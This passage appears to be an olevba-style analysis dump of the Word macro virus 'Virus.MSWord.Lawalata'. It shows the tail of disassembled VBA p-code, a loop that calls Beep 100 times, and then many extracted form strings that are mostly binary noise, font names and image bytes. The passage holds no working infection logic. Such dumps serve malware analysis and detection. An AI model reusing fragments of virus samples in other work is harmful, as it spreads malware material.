' 	VarDefn i (As Integer)
' Line #211:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #212:
' 	ArgsCall Beep 0x0000 
' Line #213:
' 	StartForVariable 
' 	Next 
' Line #214:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C L O S E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF87a7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
66x66�66�6j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6jx6j�6j�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�x6��6��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�x6��6��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�x6��6��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�x6��6��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�x6��6��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j6xj6�j6�jj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jjxjj�jj�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�xj��j��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�xj��j��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�xj��j��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�xj��j��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�xj��j���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6x�6В6��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jx�jВj���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��В����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��В����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��В����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��В����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��В���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6x�6й6��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jx�jйj���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��й����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��й����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��й����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��й����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��й���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6x�6��6��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jx�j��j�ܒ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܒxܒ�ܒ�ܹ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܹxܹ�ܹ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6x�6��6��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jx�j��j���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6x�6��6��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jx�j��j���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x������!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O�6m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�!Å
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!*�H�ᶉ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��o��}۶y�M�6�RڊD"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/m5�ԦV$Y���4�m䷅���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:Paʎ(�}�v0e�4�bY�Fu*�hҢ�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H4J����6I�\���dD���5L�o[�D��M�j-Z�X��6B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�Ҥ!��,�&��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$A}?/곥���F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�Z5*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Jz�+�!Om��F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�VD�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�42�HO#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Z����m(�[C��R����(V��z��ڊ*Ql4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5B�Hq,��m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�}=i�RH:Y��^m �Z#�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��$�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڢWJR]��5z�hˊz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�ȗ�`���F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I$��"I$i�(ɐ�Iw�Bn!�ϒB���B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IP�`��\Nz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����>Y:�7c"��6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D	%��R#�%1d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�]J�U��?����AM���^{�%�T�m��5�IW�ce5���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�O\l���6i 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`����bhآ���!�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 4�ڐ�R5�$�J+�P:U6���JlP�'M_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W�z�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�?!��]ez��ȳ�mU�p\�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʝ&Z���%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jc����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�NE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�uf�1[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"��-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#��<#h�yED
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I爐�I��mpY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~#t�g>y,fC�	u�?giK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X��Rr}�$�X�+%�D˥f�B-�0�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+楗$�X2$A߰�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ŕ�)�D����H*0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��az�%G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KA��w?S&��#��M,��e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ur4�櫰��I�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��T���ε
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�k��%�vŞ�֪l"�Ȭd4&���-vq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&,�dq�MGW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n6�X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+i([
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m ��@��� P��MH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$d�aS"Z!�Hez�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h4�)�%�,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�i�A���h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ҡ�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dń��Ĭ@���LG\ł�FP2���<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	�S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!6�)M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{ �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H/J܊y蕊�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dȣ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lawalata' - OLE stream: 'Macros/LUMLAWALATA/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�?hyLY6��&ԥy
